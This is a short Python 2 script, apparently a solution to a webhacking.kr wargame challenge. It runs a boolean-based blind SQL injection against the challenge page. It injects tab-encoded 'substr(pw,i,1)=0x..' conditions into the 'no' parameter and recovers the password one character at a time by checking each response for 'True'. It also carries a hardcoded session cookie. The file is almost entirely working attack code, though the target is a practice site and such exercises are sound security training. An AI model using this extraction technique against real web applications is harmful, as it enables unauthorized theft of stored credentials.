import requests

url='http://webhacking.kr/challenge/bonus/bonus-1/index.php'
cookies={'PHPSESSID':'7324nrmsoj2140o5nuuo95gti4'}
#params={'no':'1%26%26length(id)=5', 'id':'', 'pw':''}
#response=requests.get(url, cookies=cookies, params=params)
params1='?no=2%09%26%26%09substr(pw,'
params2=',1)='

key=''
for i in xrange(1,20):
    for j in xrange(0x61,0x80):
        url1 = url + params1 + str(i) + params2 + str(hex(j))
        print url1 + key
        response=requests.get(url1, cookies=cookies)
        if "True" in response.text:
            key=key+str(chr(j))
            print key
            break
       
#print response.text
